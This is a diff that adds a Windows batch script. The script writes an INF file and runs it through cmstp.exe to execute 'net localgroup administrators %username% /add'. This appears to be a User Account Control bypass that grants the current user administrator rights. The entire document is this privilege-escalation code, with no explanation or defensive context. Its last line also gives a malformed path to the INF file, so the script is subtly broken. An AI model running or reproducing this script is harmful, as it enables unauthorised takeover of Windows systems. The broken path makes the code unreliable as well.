@@ -1,0 +1,10 @@
+mkdir C:\temp 2>nul
+
+echo [version] > C:\temp\byp.inf 
+echo Signature=$chicago$ >> C:\temp\byp.inf
+echo [DefaultInstall] >> C:\temp\byp.inf
+echo RunPreSetupCommand=Task >> C:\temp\byp.inf
+echo [Task] >> C:\temp\byp.inf
+echo CommandLine="cmd.exe /c net localgroup administrators %username% /add" >> C:\temp\byp.inf
+
+cmstp.exe /au C:\temp.byp.inf
